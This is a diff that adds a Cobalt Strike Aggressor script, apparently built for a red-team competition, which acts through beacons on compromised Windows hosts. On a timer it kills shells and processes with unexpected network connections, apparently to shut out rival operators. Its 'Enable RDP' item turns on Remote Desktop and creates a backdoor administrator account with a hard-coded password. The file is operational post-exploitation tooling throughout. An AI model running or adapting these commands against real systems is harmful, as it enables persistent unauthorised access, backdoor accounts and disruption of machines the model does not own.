@@ -1,0 +1,139 @@
+global('@watchlist @bad $interval');
+
+$interval = "5s";
+
+sub defend {
+    local('$pid $bid $host @currlist');
+    @bad = @("notepad.exe", "cmd.exe", "powershell.exe", "rundll32.exe", "wscript.exe", "cscript.exe") ;   
+
+	@currlist = @();
+
+    foreach $beacon (beacons()) {
+        $bid = $beacon['id'];     
+		$host = binfo($bid, "external");
+        if ((int(binfo($bid, "last")) < 1000) && ($host in @watchlist) && ($host !in @currlist)) { #Ensure we don't queue on 1000 commands on a dead beacon
+			@currlist = addAll(@currlist, @($host)); #only queue on one of the living beacons
+	    	$pid = binfo($bid, "pid");
+
+            bshell($bid, "title team33shell && for /f \"tokens=2\" %i in ('tasklist /NH /FI \"WINDOWTITLE ne team33*\" ^| findstr \"rundll32 notepad cmd powershell dllhost\" ^| findstr /v $pid ') do taskkill /F /PID %i");
+            bshell($bid, "title team33shell && for /f \"tokens=5\" %i in ('netstat -ano ^| findstr ESTABLISHED ^| findstr /v \"$host $+ :80 $host $+ :443 $host $+ :445 $host $+ :135 $host $+ :139 $host $+ :110 $host $+ :389 $host $+ :23 8082 127.0.0.1 ::1 ^| findstr $pid \" ') do taskkill /F /PID %i");
+
+
+            #bshell($bid, "wmic process where \"ExecutablePath like \'%Temp%\'\" call terminate");
+        }
+     
+   }
+}
+
+
+#on beacon_initial {
+#    push(@watchlist, $1);
+#}
+
+####################
+# Menu and Aliases #
+####################
+
+popup beacon_bottom {
+	menu "Defender" {
+		item "Begin..." {
+			local('$list $bid $host');
+			$list = "";
+			foreach $bid ($1) {
+            	$host = binfo($bid, "external");
+				@watchlist = addAll(@watchlist, @($host));
+				$list .= "$host\n";
+			}
+			#Update the host
+			show_message("Added to watchlist: $list");
+		}
+
+		item "End..." {
+			$list = "";
+			foreach $bid ($1) {
+            	$host = binfo($bid, "external");
+				@watchlist = removeAll(@watchlist, @($host));
+				$list .= "$host\n";
+			}
+			
+			
+			#Update the host
+			show_message("Removed from watchlist: $list");
+		}
+
+		menu "Change Interval" {
+			item "5 seconds" {
+				$interval = "5s";
+				println("New interval: " . $interval);
+			}
+			item "10 seconds" {
+				$interval = "10s";
+				println("New interval: " . $interval);
+			}
+			item "15 seconds" {
+				$interval = "15s";
+				println("New interval: " . $interval);
+			}
+			item "1 second" {
+				$interval = "1s";
+				println("New interval: " . $interval);
+			}
+		}
+
+		item "Enable RDP"{
+			foreach $bid ($1) {
+				bshell($bid, 'reg add "hklm\system\currentControlSet\Control\Terminal Server" /v "AllowTSConnections" /t REG_DWORD /d 0x1 /f');
+				bshell($bid, 'reg add "hklm\system\currentControlSet\Control\Terminal Server" /v "fDenyTSConnections" /t REG_DWORD /d 0x0 /f');
+				bshell($bid, "sc config TermService start= auto");
+				bshell($bid, "net start Termservice");
+            	bshell($bid, "sc start termservice");
+				bshell($bid, 'net user rdpuser /add /active:yes');
+				bshell($bid, 'net user rdpuser team33isthebest');
+				bshell($bid, "NET LOCALGROUP \"Remote Desktop Users\" rdpuser /add")
+				bshell($bid, 'net localgroup administrators rdpuser /add');
+			}
+		}
+
+		item "View Watchlist" {
+			$list = "Defended Hosts:\n============\n";
+
+			foreach $bid (@watchlist) {
+				$list .= "$bid\n";
+			}
+			
+			#Update the user
+			show_message($list);
+		}
+	}
+}
+
+
+#EVENTS
+##########
+# EVENTS #
+##########
+on heartbeat_1m {
+	if ( size(@watchlist) > 0 && ($interval cmp "1m") == 0) {
+		defend();
+	}
+}
+on heartbeat_1s {
+	if ( size(@watchlist) > 0 && ($interval cmp "1s") == 0) {
+		defend();
+	}
+}
+on heartbeat_5s {
+	if ( size(@watchlist) > 0 && ($interval cmp "5s") == 0) {
+		defend();
+	}
+}
+on heartbeat_10s {
+	if ( size(@watchlist) > 0 && ($interval cmp "10s") == 0) {
+		defend();
+	}
+}
+on heartbeat_15s {
+	if ( size(@watchlist) > 0 && ($interval cmp "15s") == 0) {
+		defend();
+	}
+}
